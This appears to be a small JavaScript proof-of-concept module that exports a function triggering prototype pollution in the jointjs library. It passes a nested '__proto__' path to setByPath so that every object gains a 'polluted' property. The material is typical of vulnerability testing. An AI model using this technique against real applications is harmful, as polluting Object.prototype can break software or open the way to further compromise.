function getPayload() {
    const jointjs = require("jointjs");
    jointjs.util.setByPath({}, [["__proto__"], "polluted"], "yes");
}

module.exports = { getPayload };